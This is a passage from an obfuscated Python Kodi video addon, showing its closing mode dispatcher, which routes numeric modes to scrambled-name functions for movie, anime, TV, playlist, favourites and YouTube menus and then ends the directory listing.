 O0oOOo0Oo ( iI1i11 )
 if 98 - 98: OoOoOO00 * i1i1i11IIi - OOOo0 % OOooOOo - O00oo0OO0oOOO % ii11ii1ii
elif iIiii == 38 :
 Ii1IiI1i1ii ( iI1i11 )
 if 69 - 69: i1IIi % Ooo00oOo00o % o0OOOoO0 / OO0O / OO0O
elif iIiii == 41 :
 o0oOO00O000O0 ( IiIii111III1 )
 if 6 - 6: OoOoOO00 % ii11ii1ii % i1IIi * OO0O
elif iIiii == 39 :
 IIIIiI1I11iiI ( iI1i11 )
 if 47 - 47: O0
elif iIiii == 45 :
 TEXTS ( )
 if 55 - 55: Ooo00oOo00o % O0 / OoooooooOO
elif iIiii == 46 :
 O0Oo0Oo00o0o ( )
 if 49 - 49: OOOo0 . Ooo00oOo00o * OoooooooOO % i11iIiiIii + iIii1I11I1II1 * i1IIi
elif iIiii == 47 :
 GEVID ( )
 if 88 - 88: ii11ii1ii * O00oo0OO0oOOO + OoOoOO00
elif iIiii == 48 :
 IiiiI ( i1I1I , iI1i11 , iiii111II )
 if 62 - 62: OoooooooOO
elif iIiii == 49 :
 oOooO0 ( )
 if 33 - 33: O0 . i11iIiiIii % OOooOOo
elif iIiii == 222 :
 ooOoO00 ( iI1i11 )
 if 50 - 50: OO0O
elif iIiii == 333 :
 Iii1 ( iI1i11 )
 if 81 - 81: i11iIiiIii * iIii1I11I1II1 / Oo * Ii11I
 if 83 - 83: i11iIiiIii - OOOo0 * i11iIiiIii
elif iIiii == 1020 :
 i1ooOO00o0 ( )
 if 59 - 59: O00oo0OO0oOOO - OoooooooOO / OO0O + ii11ii1ii . OOooOOo - O00oo0OO0oOOO
elif iIiii == 1021 :
 ANIMEEP ( )
 if 29 - 29: ii
elif iIiii == 1022 :
 ANIMEPLAY ( iI1i11 )
 if 26 - 26: O0 % Ii11I - i1i1i11IIi . Ii11I
elif iIiii == 1001 :
 i111iiIiiIiI ( )
 if 70 - 70: OOooOOo + OOOO00ooo0Ooo / O00oo0OO0oOOO + OO0O / OOOo0
elif iIiii == 1005 :
 O00O0O0OO00oo ( )
 if 33 - 33: OoooooooOO . O0
elif iIiii == 1007 :
 I11IIIIiI1 ( iI1i11 )
 if 59 - 59: iIii1I11I1II1
elif iIiii == 1010 :
 IIi1i1ii11I1 ( iI1i11 )
 if 45 - 45: O0
elif iIiii == 1011 :
 oOoO0OO ( iI1i11 )
 if 78 - 78: OOOO00ooo0Ooo - iIii1I11I1II1 + o0OOOoO0 - ii11ii1ii - o0OOOoO0
elif iIiii == 1030 :
 o0OOO ( )
 if 21 - 21: OoooooooOO . O0 / i11iIiiIii
elif iIiii == 1031 :
 Iii11iI1I ( iI1i11 , o0OOo0o0O0O )
 if 86 - 86: I1IiI / Ii11I
elif iIiii == 1006 :
 Parse . ParseURL ( iI1i11 )
 if 40 - 40: iIii1I11I1II1 / OO0O / OOOo0 + ii11ii1ii * Ii11I
elif iIiii == 2030 :
 Parse . addonParseURL ( iI1i11 )
 if 1 - 1: Ooo00oOo00o * OO0O + i1i1i11IIi . ii / OO0O
elif iIiii == 2031 :
 Parse . apkParseURL ( iI1i11 )
 if 91 - 91: OOooOooo + OOOO00ooo0Ooo - Oo % I1IiI . O00oo0OO0oOOO
elif iIiii == 1002 :
 ii111 ( iI1i11 )
 if 51 - 51: Ii11I / OOOO00ooo0Ooo
elif iIiii == 1003 :
 IIiiI11 ( iI1i11 , o0OOo0o0O0O )
 if 51 - 51: OO0O * ii - o0OOOoO0 + O00oo0OO0oOOO
elif iIiii == 1004 :
 IiIII ( iI1i11 )
 if 46 - 46: OOooOOo - i11iIiiIii % Ooo00oOo00o / OOooOooo - I1IiI
elif iIiii == 1008 :
 o0o ( )
 if 88 - 88: ii * OOOo0 / Ooo00oOo00o - Ii11I / i1IIi . o0OOOoO0
elif iIiii == 1009 :
 M3UPLAY ( iI1i11 )
 if 26 - 26: i11iIiiIii - OO0O
elif iIiii == 2001 :
 oOOo00O0O0 ( iI1i11 )
 if 45 - 45: OO0O + OoOoOO00 % O00oo0OO0oOOO
elif iIiii == 1013 :
 OoOooo ( )
 if 55 - 55: OO0O - ii % OOOo0
elif iIiii == 1014 :
 IIi1ii ( )
 if 61 - 61: OO0O
elif iIiii == 1015 :
 Ii1i1i ( iI1i11 )
 if 22 - 22: iIii1I11I1II1 / OO0O / OOOo0 - OOooOOo
elif iIiii == 1016 :
 OoOooO0 ( iI1i11 )
 if 21 - 21: ii . i11iIiiIii * OOOO00ooo0Ooo . Ii11I / Ii11I
elif iIiii == 1023 :
 ii1 ( )
 if 42 - 42: OoooooooOO / o0OOOoO0 . OOooOOo / O0 - i1i1i11IIi * i1i1i11IIi
elif iIiii == 1024 :
 IiIIiII1I ( )
 if 1 - 1: OOooOooo % o0OOOoO0
elif iIiii == 1025 :
 o00oOOo0Oo ( iI1i11 )
 if 97 - 97: I1IiI
elif iIiii == 4001 :
 Oo0oOOo ( )
 if 13 - 13: I1IiI % Ii11I . O0 / Oo % Oo
elif iIiii == 4002 :
 Oo0OoO00oOO0o ( )
 if 19 - 19: o0OOOoO0 % OO0O - OO0O % OOOo0 . Ii11I - OoooooooOO
elif iIiii == 4003 :
 iI1iIIIi1i ( )
 if 100 - 100: OOOo0 + OOooOooo + OOooOOo . i1IIi % OoooooooOO
elif iIiii == 4004 :
 I11OoOoOOOoOO ( )
 if 64 - 64: O0 % i1IIi * o0OOOoO0 - OOooOooo + Oo
elif iIiii == 4005 :
 I1 ( )
 if 65 - 65: I1IiI . i11iIiiIii
elif iIiii == 4006 :
 iI11Ii ( )
 if 36 - 36: ii * O00oo0OO0oOOO + i1i1i11IIi * O00oo0OO0oOOO . ii11ii1ii - iIii1I11I1II1
elif iIiii == 4007 :
 ooOOOoOooOoO ( )
 if 14 - 14: OOOO00ooo0Ooo * ii + i11iIiiIii
elif iIiii == 4008 :
 o00oooO0Oo ( )
 if 84 - 84: O00oo0OO0oOOO / OoOoOO00
elif iIiii == 4009 : ii1ii11IIIiiI ( )
elif iIiii == 4010 : IIiI1Ii ( )
elif iIiii == 3000 :
 ooOoo ( )
 if 86 - 86: OOOo0
elif iIiii == 3001 :
 I111I1I ( )
 if 97 - 97: OoOoOO00
elif iIiii == 3002 :
 Oo0000 ( iI1i11 )
 if 38 - 38: OOOo0
elif iIiii == 3003 :
 oO0OoOo ( iI1i11 )
 if 42 - 42: OOooOOo
elif iIiii == 3004 :
 i1I11ii ( iI1i11 )
 if 8 - 8: i11iIiiIii / OO0O
elif iIiii == 404 :
 OoOiII11IiIi ( i1I1I , iI1i11 , o0OOo0o0O0O )
 if 33 - 33: o0OOOoO0 * i1i1i11IIi - O0 + OOOo0 / i1i1i11IIi
elif iIiii == 405 :
 Oo0Oo0 ( iI1i11 )
 if 19 - 19: i1IIi % OoOoOO00
elif iIiii == 7030 :
 oOoO0 ( )
 if 85 - 85: i1i1i11IIi - OOooOOo % Ii11I - OoOoOO00
elif iIiii == 7021 :
 ii1iIII1ii ( i1I1I )
 if 56 - 56: OOooOooo * i11iIiiIii
elif iIiii == 7022 :
 oo0OooO ( i1I1I )
 if 92 - 92: OoOoOO00 - O0 . o0OOOoO0
elif iIiii == 7000 :
 Iii1Iooo ( i1I1I , iI1i11 , img )
 if 59 - 59: I1IiI
elif iIiii == 7050 :
 oOoOOOO0OOO ( iI1i11 )
 if 47 - 47: OoOoOO00 - ii11ii1ii - OOooOooo
elif iIiii == 7051 :
 i11ii111i1ii ( iI1i11 )
 if 9 - 9: ii11ii1ii - i1i1i11IIi
elif iIiii == 7052 :
 I11OOO0 ( iI1i11 )
 if 64 - 64: i1IIi
elif iIiii == 7053 :
 I1Ii1 ( iI1i11 )
 if 71 - 71: i1i1i11IIi * OOooOOo
elif iIiii == 7054 :
 CoolPlay ( iI1i11 )
 if 99 - 99: OOooOOo
elif iIiii == 7060 :
 I1Iiii ( )
 if 28 - 28: OoooooooOO % O0 - Ii11I / OOooOOo / OOOo0
elif iIiii == 7061 :
 OOo0OOoo00 ( iI1i11 )
 if 41 - 41: OoOoOO00 * i1i1i11IIi / Ooo00oOo00o . ii
elif iIiii == 7063 :
 I1I1Iii1Iiii ( iI1i11 )
 if 50 - 50: OoooooooOO + iIii1I11I1II1 / ii / Ii11I . i11iIiiIii . OO0O
elif iIiii == 7062 :
 I1iii1 ( iI1i11 )
 if 75 - 75: iIii1I11I1II1 % OO0O / Ii11I - O00oo0OO0oOOO % i11iIiiIii
elif iIiii == 7064 :
 NATatozcat ( )
 if 11 - 11: OOOO00ooo0Ooo . OOooOooo
elif iIiii == 7067 :
 IiIiI11IIi11Iii ( iI1i11 )
 if 87 - 87: Ii11I + Ii11I
elif iIiii == 7066 :
 NATatozA ( iI1i11 )
 if 45 - 45: i1IIi - Oo
elif iIiii == 7065 :
 ii11i1I1i ( iI1i11 )
 if 87 - 87: I1IiI - Ooo00oOo00o * Ooo00oOo00o / OOooOooo . OOOO00ooo0Ooo * OOooOOo
elif iIiii == 7070 :
 OO00oO0OoO0o ( )
 if 21 - 21: OoOoOO00
elif iIiii == 7071 :
 DIZIlist ( iI1i11 )
 if 29 - 29: I1IiI % OOooOooo
elif iIiii == 7072 :
 DIZIpull ( iI1i11 )
 if 7 - 7: i1IIi / i1i1i11IIi / O00oo0OO0oOOO
elif iIiii == 7073 :
 WATCHDIZI ( iI1i11 )
 if 97 - 97: Ooo00oOo00o + iIii1I11I1II1
elif iIiii == 7002 :
 OOoO0o0O0 ( )
 if 79 - 79: OO0O + ii - OoOoOO00 . Oo
elif iIiii == 7003 :
 Ii1IIii ( iI1i11 )
 if 26 - 26: i1i1i11IIi
elif iIiii == 7004 :
 i1iIii1II1i ( iI1i11 )
 if 52 - 52: O0 + OO0O
elif iIiii == 7020 :
 oOoOOOOoO0 ( iI1i11 )
 if 11 - 11: i1IIi / o0OOOoO0 * ii11ii1ii * o0OOOoO0 * OO0O - i11iIiiIii
elif iIiii == 7001 :
 IIii1i ( )
 if 96 - 96: ii11ii1ii % ii11ii1ii
elif iIiii == 7010 :
 IiiiIi1iiii11 ( iI1i11 )
 if 1 - 1: OOOo0 . OOooOooo
elif iIiii == 7011 :
 O00O0 ( iI1i11 )
 if 26 - 26: ii - OO0O % Oo - ii + i1i1i11IIi
elif iIiii == 7012 :
 iIiII1iiiiI ( iI1i11 )
 if 33 - 33: OOooOooo + I1IiI - ii11ii1ii + iIii1I11I1II1 % i1IIi * i1i1i11IIi
elif iIiii == 7013 :
 cnfTVPlay2 ( iI1i11 )
elif iIiii == 7014 :
 CNF_Studio_Indexer . MV_Movies ( iI1i11 )
elif iIiii == 7015 :
 CNF_Studio_Indexer . Movie_ByYear ( iI1i11 )
elif iIiii == 7016 :
 CNF_Studio_Indexer . Resolve_CNF_Link ( i1I1I , iI1i11 , o0OOo0o0O0O )
elif iIiii == 7017 :
 CNF_Studio_Indexer . Search_Movie ( )
elif iIiii == 7018 :
 OOoo0O00 ( )
elif iIiii == 7019 :
 CNF_Studio_Indexer . List_Movies ( iI1i11 )
elif iIiii == 7020 :
 CNF_Studio_Indexer . Get_Movie_Page ( iI1i11 )
elif iIiii == 7024 :
 CNF_Studio_Indexer . Box_Office ( iI1i11 )
 if 21 - 21: O0 * OO0O % Ooo00oOo00o
elif iIiii == 8000 :
 oOO00OO0OooOo ( )
elif iIiii == 8001 :
 o0O00OooooO ( )
elif iIiii == 8002 :
 iI1iIIIIIiIi1 ( )
elif iIiii == 8003 :
 iiI1iIII1ii ( )
elif iIiii == 8004 :
 OOO000Oo ( )
elif iIiii == 8005 :
 o00o0o000Oo ( )
elif iIiii == 8006 :
 oOIIII ( i1I1I , iI1i11 )
elif iIiii == 8030 :
 IIi11IIiIii1 ( iI1i11 )
elif iIiii == 8045 :
 i1oOOO0ooOO ( iI1i11 )
elif iIiii == 8046 :
 i11IiI1iiI11 ( iI1i11 )
elif iIiii == 8047 :
 IIii1III ( iI1i11 )
elif iIiii == 8020 :
 Ooooo00 ( )
elif iIiii == 8021 :
 oOOooooO ( iI1i11 )
elif iIiii == 8022 :
 o000Ooo00o00O ( iI1i11 )
elif iIiii == 8023 :
 ooo0O0O0oo0 ( iI1i11 )
elif iIiii == 8040 :
 iII1Iii11111 ( )
elif iIiii == 8041 :
 OOo00ooOoO0o ( iI1i11 )
elif iIiii == 8042 :
 Iii ( iI1i11 )
elif iIiii == 8043 :
 yt . PlayVideo ( iI1i11 )
elif iIiii == 8044 :
 i1iI111II1ii ( iI1i11 )
elif iIiii == 8060 :
 i1iI1i ( )
elif iIiii == 8061 :
 o0o0OoO0OOO0 ( iI1i11 )
elif iIiii == 8064 :
 ii1IIiII111I ( )
elif iIiii == 8065 :
 O00OoOoO ( iI1i11 )
elif iIiii == 8070 :
 ii1ii1i11I1I ( )
elif iIiii == 8071 :
 iiII1iiiiiii ( iI1i11 )
elif iIiii == 7080 :
 iiIiii ( iI1i11 )
elif iIiii == 8090 :
 oooo ( )
elif iIiii == 8091 :
 o0o0oo0Ooo ( iI1i11 )
elif iIiii == 8092 :
 iI1i ( iI1i11 )
elif iIiii == 8081 :
 ooIi111iII ( )
elif iIiii == 8062 :
 OOooO00OO ( iI1i11 )
elif iIiii == 8063 :
 i1i1IIII ( iI1i11 )
elif iIiii == 8050 :
 o0OO0O0Oo ( )
elif iIiii == 8051 :
 OOOOO ( iI1i11 )
elif iIiii == 8052 :
 OOoOOo0O00O ( iI1i11 )
elif iIiii == 8085 :
 I1II ( )
elif iIiii == 8086 :
 iII1iI1IIiI ( iI1i11 )
elif iIiii == 8087 :
 oO0O ( iI1i11 )
elif iIiii == 8088 :
 OOoooO00o0o ( iI1i11 , i1I1I )
elif iIiii == 9000 :
 Ii1i1i1i1I1Ii ( )
elif iIiii == 1111 :
 oOOO00Oo ( )
elif iIiii == 9001 :
 IIOOOoO00O ( )
elif iIiii == 9002 :
 i1Ii11ii1I ( )
elif iIiii == 9003 :
 I1Ii1i11I1I ( )
elif iIiii == 50 :
 O0o ( iI1i11 )
elif iIiii == 9020 :
 champlist ( )
elif iIiii == 9021 :
 OO0o0o0oo ( )
elif iIiii == 9022 :
 iIiII1 ( )
elif iIiii == 9023 :
 i111iii1I1 ( )
elif iIiii == 9024 :
 oOIIIi11 ( iI1i11 )
elif iIiii == 9030 :
 o00OoO0o0 ( iI1i11 )
elif iIiii == 9031 :
 o0OOOoO0ooOOOo0 ( iI1i11 )
elif iIiii == 9032 :
 o0oOOO ( iI1i11 )
elif iIiii == 9033 :
 IIi11 ( iI1i11 )
elif iIiii == 7085 :
 I11iiIi1i1IIi ( iI1i11 )
elif iIiii == 7086 :
 i1Ii1i1I11III ( iI1i11 )
elif iIiii == 7087 :
 oOoOO ( iiii111II )
elif iIiii == 9666 :
 i1I111II11 ( iI1i11 )
elif iIiii == 10100 : o0OOooO ( )
elif iIiii == 10105 : iIiIi1iIIi11i ( iI1i11 )
elif iIiii == 10106 : oO0O0o0O ( iI1i11 )
elif iIiii == 10104 : O0oooOoO ( iI1i11 )
elif iIiii == 10107 : iiiI ( )
elif iIiii == 10103 : o0oOoOo0 ( iI1i11 )
elif iIiii == 10108 : ii1IiIi1i ( iI1i11 )
elif iIiii == 10107 : iiiI ( )
elif iIiii == 10000 : Origin_Menu ( )
elif iIiii == 10001 : I1ii1iI1II11ii ( )
elif iIiii == 10002 : OO0ooOoOO0OOo ( )
elif iIiii == 10003 : I1i1IiI1i ( )
elif iIiii == 10004 : o0O0OO ( iI1i11 )
elif iIiii == 10005 : III1ii ( )
elif iIiii == 10006 : oo0o0 ( iI1i11 )
elif iIiii == 10007 : iIiiIiiIi ( iI1i11 , o0OOo0o0O0O )
elif iIiii == 10008 : III1III11II ( )
elif iIiii == 10009 : oO0oo0o00o0O ( )
elif iIiii == 10010 : i1I11 ( iI1i11 )
elif iIiii == 10011 : OO0Oo ( iI1i11 )
elif iIiii == 10012 : ooOooOoOoO ( iI1i11 )
elif iIiii == 10013 : IiIi ( iI1i11 )
elif iIiii == 10014 : Ii ( )
elif iIiii == 10015 : oooO00o0 ( )
elif iIiii == 10016 : O0OOOo ( iI1i11 )
elif iIiii == 10017 : O0oOoo0OoO0O ( )
elif iIiii == 10018 : IIi1I1i ( )
elif iIiii == 10019 : O00oo ( )
elif iIiii == 10020 : ii1I11i ( )
elif iIiii == 10021 : Ii1i1 ( )
elif iIiii == 10022 : iiioOOOo ( iI1i11 )
elif iIiii == 10023 : ooO00o ( i1I1I , iI1i11 )
elif iIiii == 10024 : IiI1 ( iI1i11 )
elif iIiii == 10025 : i1IIi1i1Ii1 ( )
elif iIiii == 10026 : oO0ooOO ( )
elif iIiii == 10027 : OOo0O0O000 ( )
elif iIiii == 10028 : OoOOo00 ( )
elif iIiii == 10029 : iI11Ii111 ( )
elif iIiii == 423 : iIIi1 ( iI1i11 )
elif iIiii == 426 : I1I1I11Ii ( iI1i11 )
elif iIiii == 10030 : Izle_Films ( )
elif iIiii == 10031 : Latest_Izle_Movies ( )
elif iIiii == 10032 : Izle_Genres ( )
elif iIiii == 10033 : Izle_Pop_Movies ( )
elif iIiii == 10034 : Izle_Boxsets ( )
elif iIiii == 10035 : Izle_Search ( )
elif iIiii == 10036 : Izle_Genres_Movie ( iI1i11 )
elif iIiii == 10037 : Izle_Boxset_single ( iI1i11 )
elif iIiii == 10038 : Izle_IFRAME ( )
elif iIiii == 10039 : Izle_Boxsets_Next ( iI1i11 )
elif iIiii == 10040 : iI111i11iI1 ( )
elif iIiii == 10041 : oOOoOOO0oo0 ( iI1i11 )
elif iIiii == 10042 : iiII1iiIi ( iI1i11 )
elif iIiii == 10043 : o0OO0OOO0O ( )
elif iIiii == 10044 : oOOOoo0o ( iI1i11 )
elif iIiii == 10045 : ooooo0Oo0 ( i1I1I )
elif iIiii == 10046 : i11Iii1Ii1i1 ( iI1i11 )
elif iIiii == 10047 : I11II1i11 ( iI1i11 )
elif iIiii == 10048 : IiIooo ( iI1i11 )
elif iIiii == 10049 : i1I1iI ( iI1i11 )
elif iIiii == 10050 : II1III11Iii1I ( )
elif iIiii == 10051 : iiiiIii11i1 ( )
elif iIiii == 10052 : OOO0 ( )
elif iIiii == 10053 : Addon ( iI1i11 )
elif iIiii == 10054 : i1ii11I111Ii ( iI1i11 , i1I1I )
elif iIiii == 10055 :
 oo0oO ( "addFavorite" )
 try :
  i1I1I = i1I1I . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  i1I1I = i1I1I . split ( '  - ' ) [ 0 ]
 except :
  pass
 o0oO0Oo ( i1I1I , iI1i11 , o0OOo0o0O0O , o0OO0o0oOOO0O , iioOOO00oOo )
elif iIiii == 10056 :
 oo0oO ( "rmFavorite" )
 try :
  i1I1I = i1I1I . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  i1I1I = i1I1I . split ( '  - ' ) [ 0 ]
 except :
  pass
 OO ( i1I1I )
elif iIiii == 10057 :
 oo0oO ( "getFavorites" )
 o0OO ( )
elif iIiii == 10058 : I1ii1I1iiii ( )
elif iIiii == 10059 : Donators_Guide ( )
elif iIiii == 10060 : I1i ( )
elif iIiii == 10061 : iIi1i1iIi1iI ( )
elif iIiii == 10062 : i1II1I1Iii1 ( i1I1I , iI1i11 , iiii111II )
elif iIiii == 10063 : I1IIIiI11i1 ( )
elif iIiii == 10064 : o000ooooO0o ( )
elif iIiii == 10065 : I1i1i1 ( iI1i11 )
elif iIiii == 10066 : o0O ( iI1i11 )
elif iIiii == 10068 : o0OOOoO0o0OoOo00o0o ( iI1i11 )
elif iIiii == 10069 : ooO ( iI1i11 )
elif iIiii == 10070 : I11I ( iI1i11 )
elif iIiii == 10071 : Genie_Watch ( )
elif iIiii == 10072 : Ii1I1Ii ( )
elif iIiii == 10073 : ooO0O0O0ooOOO ( iI1i11 )
elif iIiii == 10074 : OoO ( iI1i11 )
elif iIiii == 10075 : I1i1I11I ( o0OOo0o0O0O , i1I1I , iI1i11 )
elif iIiii == 10076 : ii1iii1i ( iI1i11 )
elif iIiii == 10077 : IiI ( iI1i11 )
elif iIiii == 10078 : i1i ( )
elif iIiii == 10079 : Genie_Watch_Tv_Shows ( )
elif iIiii == 10080 : Genie_Watch_Tv_Genre ( iI1i11 )
elif iIiii == 10081 : Genie_Watch_TV_PlayRun ( iI1i11 )
elif iIiii == 10082 : Genie_Watch_TV_Episodes ( iI1i11 , o0OOo0o0O0O )
elif iIiii == 10083 : Genie_Watch_Tv_Recent ( iI1i11 )
elif iIiii == 10084 : oOOo0oOo0 ( )
elif iIiii == 20000 : i1iiIIi11I ( )
elif iIiii == 20001 : oo000o0 ( )
elif iIiii == 20002 : ii1IiIi11 ( iI1i11 )
elif iIiii == 20003 : ii1ii ( iI1i11 )
elif iIiii == 20004 : o0Oo ( iI1i11 )
elif iIiii == 21004 : o0oooO ( )
elif iIiii == 21005 : ooOo ( iI1i11 )
elif iIiii == 21006 : oOOOOOoOO ( iI1i11 )
elif iIiii == 21007 : i111i11I1ii ( iI1i11 )
elif iIiii == 30000 : ii1I11iIiIII1 ( )
elif iIiii == 30001 : O0ooOo0o0Oo ( )
elif iIiii == 10012 : Resolve ( iI1i11 )
elif iIiii == 30003 : ooO00O00oOO ( )
elif iIiii == 30004 : Ii1 ( iI1i11 )
elif iIiii == 30005 : II1II ( iI1i11 )
elif iIiii == 30006 : oooo00 ( )
elif iIiii == 30007 : iI ( )
elif iIiii == 30008 : i1iiiIii11 ( iI1i11 )
elif iIiii == 30009 : i11I1I1iiI ( iI1i11 )
elif iIiii == 30010 : IiiIIiiiiii ( iI1i11 )
elif iIiii == 30011 : IIIii1iiIi ( )
elif iIiii == 30012 : i1II ( )
elif iIiii == 30013 : iIIiiIIi1IiI ( )
elif iIiii == 30014 : I11IoOoO ( )
if 14 - 14: O0 / o0OOOoO0 / OO0O + i1i1i11IIi - i1i1i11IIi
xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
